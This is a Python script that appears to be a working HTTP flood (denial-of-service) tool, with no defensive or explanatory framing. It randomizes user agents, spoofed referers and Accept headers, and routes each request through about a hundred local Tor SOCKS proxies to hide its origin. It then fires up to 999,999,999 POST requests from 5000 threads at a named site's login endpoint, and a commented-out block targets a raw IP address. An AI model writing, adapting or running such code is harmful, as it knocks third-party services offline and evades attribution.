import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import requests
import random
from threading import Thread
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
#
#  pip install fake-useragent


referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
		"Accept: text/html, application/xhtml+xml",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5"
]

## socks列表 netstat -antlp | grep tor | awk '{print $4}' | sed 's/^/"&/g' | sed 's/$/&",/g'
tor_proxy=[
    "127.0.0.1:10093",
    "127.0.0.1:10061",
    "127.0.0.1:10029",
    "127.0.0.1:10094",
    "127.0.0.1:10062",
    "127.0.0.1:10030",
    "127.0.0.1:10095",
    "127.0.0.1:10063",
    "127.0.0.1:10031",
    "127.0.0.1:10096",
    "127.0.0.1:10064",
    "127.0.0.1:10032",
    "127.0.0.1:10097",
    "127.0.0.1:10065",
    "127.0.0.1:10033",
    "127.0.0.1:20017",
    "127.0.0.1:10001",
    "127.0.0.1:10098",
    "127.0.0.1:10066",
    "127.0.0.1:10034",
    "127.0.0.1:20018",
    "127.0.0.1:10002",
    "127.0.0.1:10099",
    "127.0.0.1:10067",
    "127.0.0.1:10035",
    "127.0.0.1:20019",
    "127.0.0.1:10003",
    "127.0.0.1:10100",
    "127.0.0.1:10068",
    "127.0.0.1:10036",
    "127.0.0.1:20020",
    "127.0.0.1:10004",
    "127.0.0.1:10069",
    "127.0.0.1:10037",
    "127.0.0.1:20021",
    "127.0.0.1:10005",
    "127.0.0.1:10070",
    "127.0.0.1:10038",
    "127.0.0.1:20022",
    "127.0.0.1:10006",
    "127.0.0.1:10071",
    "127.0.0.1:10039",
    "127.0.0.1:10007",
    "127.0.0.1:10072",
    "127.0.0.1:10040",
    "127.0.0.1:10008",
    "127.0.0.1:10073",
    "127.0.0.1:10041",
    "127.0.0.1:10009",
    "127.0.0.1:10074",
    "127.0.0.1:10042",
    "127.0.0.1:10010",
    "127.0.0.1:10075",
    "127.0.0.1:10043",
    "127.0.0.1:10011",
    "127.0.0.1:10076",
    "127.0.0.1:10044",
    "127.0.0.1:10012",
    "127.0.0.1:10077",
    "127.0.0.1:10045",
    "127.0.0.1:10013",
    "127.0.0.1:10078",
    "127.0.0.1:10046",
    "127.0.0.1:10014",
    "127.0.0.1:10079",
    "127.0.0.1:10047",
    "127.0.0.1:10015",
    "127.0.0.1:10080",
    "127.0.0.1:10048",
    "127.0.0.1:10016",
    "127.0.0.1:10081",
    "127.0.0.1:10049",
    "127.0.0.1:10082",
    "127.0.0.1:10050",
    "127.0.0.1:10083",
    "127.0.0.1:10051",
    "127.0.0.1:10084",
    "127.0.0.1:10052",
    "127.0.0.1:10085",
    "127.0.0.1:10053",
    "127.0.0.1:10086",
    "127.0.0.1:10054",
    "127.0.0.1:10087",
    "127.0.0.1:10055",
    "127.0.0.1:10023",
    "127.0.0.1:10088",
    "127.0.0.1:10056",
    "127.0.0.1:10024",
    "127.0.0.1:10089",
    "127.0.0.1:10057",
    "127.0.0.1:10025",
    "127.0.0.1:10090",
    "127.0.0.1:10058",
    "127.0.0.1:10026",
    "127.0.0.1:10091",
    "127.0.0.1:10059",
    "127.0.0.1:10027",
    "127.0.0.1:10092",
    "127.0.0.1:10060",
    "127.0.0.1:10028",
]

Choice = random.choice


def requestsweb(url, proxy):

    header = {
        'User-Agent': UserAgent().random,
        'accept': random.choice(acceptall),
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'Keep-Alive',
        'Referer':  random.choice(referers) + url,
        'upgrade-insecure-requests': '1',
        'Cache-Control': 'max-age=0',
    }

    http_proxies = {
        'http': f"http://"+proxy,
        # 'https': f"http://{proxy}"
    }

    socks_proxies = {'http': f"socks5://"+proxy,
                     'https': f"socks5://"+proxy}

    resp = requests.post(url, headers=header, proxies=socks_proxies)
    print(resp.status_code)


if __name__ == '__main__':
    starttime = time.time()

    # with ThreadPoolExecutor(3) as t:
    # 创建一个包含2条线程的线程池
    # pool = ThreadPoolExecutor(max_workers=80)  # 定义个线程
    # # 向线程池提交5个任务
    # for i in range(2000):
    #     future1 = pool.submit(requestsweb('http://45.77.39.181/', random.choice(tor_proxy)), i)  # 任务加入线程池
    # pool.shutdown()
    # while 1:
    #     t1 = Thread(target=requestsweb, args=('http://45.77.39.181/', random.choice(tor_proxy),))
    #     t1.start()

    with ThreadPoolExecutor(5000) as t:
        for i in range(999999999): #  任务数量
            t.submit(requestsweb,"https://mec333.net/mobile-api/v5/passport/login.html?username=2sefesfvs12&password=xvxfdbrxds&type=index", random.choice(tor_proxy))
    # t2.start()
    print(f"共耗时------> ",time.time()-starttime)
	 # ulimit -n 109999






